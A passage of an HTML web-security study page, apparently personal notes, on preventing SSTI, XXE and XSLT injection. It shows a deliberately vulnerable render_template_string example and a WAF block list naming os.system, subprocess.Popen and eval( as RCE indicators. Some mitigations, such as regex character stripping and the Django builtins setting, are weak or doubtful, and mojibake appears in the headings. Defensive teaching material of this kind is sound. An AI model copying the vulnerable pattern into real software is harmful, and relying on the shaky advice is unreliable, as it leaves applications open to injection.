return render_template_string(f"Hello, {user_input}")</code>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Ã¢Å“â€¦ <strong>Safe Alternative (Use Static Templates):</strong></p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;"># Pass user input as a variable (escaped by default)
return render_template("welcome.html", username=user_input)
----------
#This is not vulnerable to because the user's first name is merely passed into the template as data. 
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );</code>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Static templates separate <strong>data</strong> from <strong>code</strong>, preventing execution.</p>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Strict Input Validation &amp; Sanitization</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Block template syntax</strong> (<code>{{ }}</code>, <code>&lt;%= %&gt;</code>, <code>${ }</code>).</li>
                  <li style="margin-bottom: 10px;"><strong>Use allowlists</strong> (only permit safe characters).</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Ã¢Å“â€¦ <strong>Example (Python - Input Sanitization):</strong></p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">import re

def sanitize_input(input_str):
    # Remove dangerous template syntax
    return re.sub(r"[{}\<\>%\$]", "", input_str)</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Use Sandboxed Template Engines</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Sandboxing</strong> &rarr; Runs templates in a restricted environment to block dangerous actions (file access, system commands).</li>
                  <li style="margin-bottom: 10px;"><strong>Jinja2 Sandbox Mode</strong> &rarr; Limits available functions and objects, preventing access to <code>os</code>, <code>subprocess</code>, etc.</li>
                  <li style="margin-bottom: 10px;"><strong>Purpose</strong> &rarr; Mitigates SSTI by removing unsafe modules/functions.</li>
                  <li style="margin-bottom: 10px;"><strong>Best Practice</strong> &rarr; Disable risky features (<code>os.system</code>, file I/O) and allow only safe operations.</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>Importance of Sandboxing</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Function Restrictions</strong>: Limits the functions or methods that can be called from within the template, blocking potentially harmful operations.</li>
                  <li style="margin-bottom: 10px;"><strong>Variable and Data Access</strong>: Controls access to global variables or sensitive data, ensuring templates cannot manipulate or expose critical information.</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")  # Blocks RCE attempts</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4. Limit Template Engine Features</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Disable <code>eval()</code> and <code>exec</code></strong> in template configurations.</li>
                  <li style="margin-bottom: 10px;"><strong>Restrict object access</strong> (e.g., block <code>__class__</code>, <code>__globals__</code>).</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Ã¢Å“â€¦ <strong>Example (Django - Safe Settings):</strong></p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">TEMPLATES = [{
    'OPTIONS': {
        'builtins': [],  # Disable dangerous built-in functions
    }
}]</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5. Never let user input be directly passed into a template engineÃ¢â‚¬â„¢s render function, because attackers could inject malicious code.</h3>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Ã°Å¸Å¡Â¨ Mitigation Steps (If SSTI is Detected)</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Patch Vulnerable Endpoints</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Replace <code>render_template_string()</code> with <strong>static templates</strong>.</li>
                  <li style="margin-bottom: 10px;">Apply <strong>input sanitization</strong> immediately.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. WAF (Web Application Firewall) Rules</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Block requests containing:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><code>{{ }}</code>, <code>&lt;%= %&gt;</code>, <code>${ }</code> (template syntax).</li>
                  <li style="margin-bottom: 10px;"><code>os.system</code>, <code>subprocess.Popen</code>, <code>eval(</code> (RCE indicators).</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Log &amp; Monitor Suspicious Activity</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Alert on template syntax</strong> in user inputs.</li>
                  <li style="margin-bottom: 10px;"><strong>Audit logs</strong> for unusual server commands.</li>
                </ul>

                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <ol style="font-size: 1.2rem; padding-left: 20px; margin: 0;">
                    <li style="margin-bottom: 10px;"><strong>Never use <code>render_template_string()</code> with user input.</strong></li>
                    <li style="margin-bottom: 10px;"><strong>Sanitize inputs</strong> to block template syntax.</li>
                    <li style="margin-bottom: 10px;"><strong>Use sandboxing</strong> (Jinja2 Sandbox, Twig Sandbox).</li>
                    <li style="margin-bottom: 10px;"><strong>Monitor &amp; patch</strong> vulnerable endpoints.</li>
                  </ol>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/vulnerable-code-24a27bcaaa96806ea639f3281f28944f?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vulnerable Code <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/methodology-24a27bcaaa9680ff9595d0d1d4f384a6?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Methodology <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Tools-24a27bcaaa9680449eb9e2e433e42325?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Writeups-24d27bcaaa96808c9752e05ce3413a41?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Notes-24e27bcaaa9680c0a24ef3fe1eeed156?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              XML External Entity Injection ( XXE )
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;">
                  <a href="https://www.notion.so/XML-2a227bcaaa968021bc69c249c0b8beeb?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: bold; font-size: 1.4rem;">XML Resource</a>
                </p>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Web Security Vulnerability allow attacker to interfere with application is processing of XML data .</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it</li>
                  <li style="margin-bottom: 10px;">it allow attacker to view files on application server and attacker can use XXE to perform SSRF attack and interact with internal systems</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; it happen when XML parser configured to process external entities</p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How do XXE vulnerabilities arise?</h2>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <ol style="font-size: 1.2rem; padding-left: 20px; margin: 0;">
                    <li style="margin-bottom: 10px;"><strong>XML parsers support dangerous features</strong> (like external entities and DTDs parsing) even when the app doesn't need them.</li>
                    <li style="margin-bottom: 10px;"><strong>Parsers/processors are left configured to process external entities</strong> (external entity processing enabled).</li>
                    <li style="margin-bottom: 10px;"><strong>Applications accept and parse untrusted/user XML Input</strong> without validation or sanitization.</li>
                    <li style="margin-bottom: 10px;">Use of standard XML <strong>libraries / API</strong> with dangerous features enabled by default.</li>
                  </ol>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Impact of XXE &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Information Disclosure</strong> &ndash; Attackers can read sensitive files from the server (e.g., <code>/etc/passwd</code>).</li>
                  <li style="margin-bottom: 10px;"><strong>Server-Side Request Forgery (SSRF)</strong> &ndash; Attackers can make the server send requests to internal systems.</li>
                  <li style="margin-bottom: 10px;"><strong>Denial of Service (DoS)</strong> &ndash; Large or recursive XML entities can crash the server.</li>
                  <li style="margin-bottom: 10px;"><strong>Remote Code Execution (RCE)</strong> &ndash; In some cases, attackers can execute arbitrary commands on the server.</li>
                  <li style="margin-bottom: 10px;"><strong>Bypass Access Controls</strong> &ndash; Attackers can access restricted resources through crafted XML input.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How Prevent &amp;&amp; Mitigate XXE &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Disable External Entities and DTDs &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.</li>
                  <li style="margin-bottom: 10px;"><strong>Disable XInclude and external references</strong> &ndash; Stop the parser from including or loading external XML files.</li>
                  <li style="margin-bottom: 10px;">Disable referencing custom <code>Document Type Definitions (DTDs)</code></li>
                  <li style="margin-bottom: 10px;">Disable referencing <code>External XML Entities</code></li>
                  <li style="margin-bottom: 10px;">Disable <code>Parameter Entity</code> processing</li>
                  <li style="margin-bottom: 10px;">Disable support for <code>XInclude</code></li>
                  <li style="margin-bottom: 10px;">Prevent <code>Entity Reference Loops</code></li>
                  <li style="margin-bottom: 10px;">Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and <code>should always disable displaying runtime errors in web servers</code>.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Use Less Complex Data Formats &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Allow listing Input Validation &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Validate all incoming data against a strict schema that defines expected data types and patterns. Exclude or escape XML-specific characters such as &lt;, &gt;, &amp;, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.</li>
                  <li style="margin-bottom: 10px;"><strong>Validate and sanitize XML input</strong> &ndash; Accept XML only from trusted sources and validate it against a schema.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Avoiding Misconfigurations &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities.</li>
                  <li style="margin-bottom: 10px;">Adjusting these settings can significantly reduce the risk of XXE attacks.</li>
                  <li style="margin-bottom: 10px;"><strong>Use a safe XML parser</strong> &ndash; Choose modern or hardened libraries that are not vulnerable to XXE by default (e.g., defusedxml in Python).</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Regularly Update and Patch &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Software Updates</strong>: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.</li>
                  <li style="margin-bottom: 10px;"><strong>Security Patches</strong>: Regularly apply security patches to web applications and their environments.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Security Awareness and Code Reviews &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Conduct Code Reviews</strong>: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.</li>
                  <li style="margin-bottom: 10px;"><strong>Promote Security Training</strong>: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Avoid Outdated Components &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities.</li>
                  <li style="margin-bottom: 10px;">This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.</li>
                  <li style="margin-bottom: 10px;">For example, PHP's <a href="https://www.php.net/manual/en/function.libxml-disable-entity-loader.php" target="_blank" style="color: #2563eb; text-decoration: underline;">libxml_disable_entity_loader</a> function is deprecated since it allows a developer to enable external entities in an unsafe manner, which leads to XXE vulnerabilities.</li>
                  <li style="margin-bottom: 10px;">In addition to updating the XML libraries, we should also update any components that parse XML input, such as API libraries like SOAP. Furthermore, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                  <a href="https://www.notion.so/XXE-Attacks-2a327bcaaa968009b649da751a463cb7?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">XXE Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/XML-Tag-Injection-2e127bcaaa9680578238ebaedf8f1ab9?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">XML Tag Injection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/XPath-Injection-2e127bcaaa968041adefe7d794883cc6?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">XPath Injection <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Writeups-2a327bcaaa96807b9c48ce487db8b1d3?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Notes-2a327bcaaa9680eca894d84868a3506c?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                  <a href="https://www.notion.so/Tools-2a327bcaaa968038b7dfe9180810d9f8?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                </div>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              XSLT Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Introduction &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; <a href="https://www.w3.org/TR/xslt-30/" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: bold;">eXtensible Stylesheet Language Transformation (XSLT)</a> <strong>is a language enabling the transformation of XML documents.</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">For instance, it can select specific nodes from an XML document and change the XML structure.</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; XSLT is a language used to <strong>transform XML documents into other formats</strong> such as &rarr;</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">HTML (for web pages)</li>
                  <li style="margin-bottom: 10px;">Another XML structure</li>
                  <li style="margin-bottom: 10px;">Plain text</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">What is it used for?</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Display XML in browsers</strong> &rarr; Convert XML into readable HTML pages</li>
                  <li style="margin-bottom: 10px;"><strong>Data transformation</strong> &rarr; Change XML structure (e.g., one schema &rarr; another)</li>
                  <li style="margin-bottom: 10px;"><strong>Data extraction</strong> &rarr; Pull specific elements from XML</li>
                  <li style="margin-bottom: 10px;"><strong>Integration between systems</strong> &rarr; Convert XML into formats required by other systems</li>
                </ul>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Since XSLT operates on XML-based data, we will consider the following sample XML document to explore how XSLT operates &rarr;</p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;fruits&gt;
    &lt;fruit&gt;
        &lt;name&gt;Apple&lt;/name&gt;
        &lt;color&gt;Red&lt;/color&gt;
        &lt;size&gt;Medium&lt;/size&gt;
    &lt;/fruit&gt;
    &lt;fruit&gt;
        &lt;name&gt;Banana&lt;/name&gt;
        &lt;color&gt;Yellow&lt;/color&gt;
        &lt;size&gt;Medium&lt;/size&gt;
    &lt;/fruit&gt;
    &lt;fruit&gt;
        &lt;name&gt;Strawberry&lt;/name&gt;
        &lt;color&gt;Red&lt;/color&gt;
        &lt;size&gt;Small&lt;/size&gt;
    &lt;/fruit&gt;
&lt;/fruits&gt;</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">XSLT can be used to define a data format that is subsequently enriched with data from the XML document.</li>
                  <li style="margin-bottom: 10px;">can used to extract data form XML document.</li>
                  <li style="margin-bottom: 10px;">XSLT data is structured similarly to XML.</li>
                </ul>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">However, it contains XSL elements within nodes prefixed with the <code>xsl</code>-prefix. The following are some commonly used XSL elements &rarr;</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><code>&lt;xsl:template&gt;</code>: This element indicates an XSL template. It can contain a <code>match</code> attribute that contains a path in the XML document that the template applies to</li>
                  <li style="margin-bottom: 10px;"><code>&lt;xsl:value-of&gt;</code>: This element extracts the value of the XML node specified in the <code>select</code> attribute</li>
                  <li style="margin-bottom: 10px;"><code>&lt;xsl:for-each&gt;</code>: This element enables looping over all XML nodes specified in the <code>select</code> attribute</li>
                  <li style="margin-bottom: 10px;"><code>&lt;xsl:sort&gt;</code>: This element specifies how to sort elements in a for loop in the <code>select</code> argument. Additionally, a sort order may be specified in the <code>order</code> argument</li>
                  <li style="margin-bottom: 10px;"><code>&lt;xsl:if&gt;</code>: This element can be used to test for conditions on a node. The condition is specified in the <code>test</code> argument.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);"><strong>&rarr; Example &rarr;</strong></h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;?xml version="1.0"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
    &lt;xsl:template match="/fruits"&gt;
        Here are all the fruits:
        &lt;xsl:for-each select="fruit"&gt;
            &lt;xsl:value-of select="name"/&gt; (&lt;xsl:value-of select="color"/&gt;)
        &lt;/xsl:for-each&gt;
    &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;

Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
    
    
    ----------------------------------------------
    &lt;?xml version="1.0"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
    &lt;xsl:template match="/fruits"&gt;
        Here are all fruits of medium size ordered by their color:
        &lt;xsl:for-each select="fruit"&gt;
            &lt;xsl:sort select="color" order="descending" /&gt;
            &lt;xsl:if test="size = 'Medium'"&gt;
                &lt;xsl:value-of select="name"/&gt; (&lt;xsl:value-of select="color"/&gt;)
            &lt;/xsl:if&gt;
        &lt;/xsl:for-each&gt;
    &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;

        txt
Here are all fruits of medium size ordered by their color:
    Banana (Yellow)
    Apple (Red)</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">As we can see, the XSLT document contains a single <code>&lt;xsl:template&gt;</code> XSL element that is applied to the <code>&lt;fruits&gt;</code> node in the XML document. The template consists of the static string <code>Here are all the fruits:</code> and a loop over all <code>&lt;fruit&gt;</code> nodes in the XML document. For each of these nodes, the values of the <code>&lt;name&gt;</code> and <code>&lt;color&gt;</code> nodes are printed using the <code>&lt;xsl:value-of&gt;</code> XSL element.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; XSLT Injection &rarr;</h2>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <p style="font-size: 1.2rem; margin: 0;"><strong>&rarr; XSLT injection occurs whenever user input is inserted into XSL data before the XSLT processor generates output. This enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during the output generation process.</strong></p>
                </div>
                
                <p style="font-size: 1.2rem; margin-bottom: 20px;">
                  <a href="https://www.notion.so/Attacks-33627bcaaa9680fcabbac21d5a96f7d7?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: bold; font-size: 1.4rem;">Attacks Resource</a>
                </p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How Prevent Attack &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;">Similar to all injection vulnerabilities discussed in this module, XSLT injection can be prevented by ensuring that user input is not inserted into XSL data before it is processed by the XSLT processor.</li>
                  <li style="margin-bottom: 15px;">However, if the output should reflect values provided by the user, user-provided data must be added to the XSL document before processing.
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">In this case, it is essential to implement proper sanitization and input validation to avoid XSLT injection vulnerabilities.</li>
                      <li style="margin-bottom: 5px;">This may prevent attackers from injecting additional XSLT elements, but the implementation may depend on the output format.</li>
                    </ul>
                  </li>
